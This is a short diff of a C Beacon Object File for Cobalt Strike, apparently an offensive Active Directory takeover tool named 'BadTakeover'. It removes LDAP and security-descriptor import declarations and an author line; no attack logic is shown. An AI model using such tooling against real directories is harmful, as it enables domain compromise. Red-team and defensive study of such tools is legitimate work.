@@ -7,30 +7,9 @@
 
 #pragma comment(lib, "wldap32.lib")
 
-// LDAP imports
-WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_add_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
-WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);
-
-// advapi32 import for SD conversion
-DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
-    LPCSTR StringSecurityDescriptor,
-    DWORD StringSDRevision,
-    PSECURITY_DESCRIPTOR *SecurityDescriptor,
-    PULONG SecurityDescriptorSize
-);
-
-DECLSPEC_IMPORT char *MSVCRT$strcpy(char *dst, const char *src);
-DECLSPEC_IMPORT char *MSVCRT$strcat(char *dst, const char *src);
-
 void go(char *args, int len) {
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] BadTakeover BOF started\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Author @_logangoins\n\n");
     datap parser;
     BeaconDataParse(&parser, args, len);
 
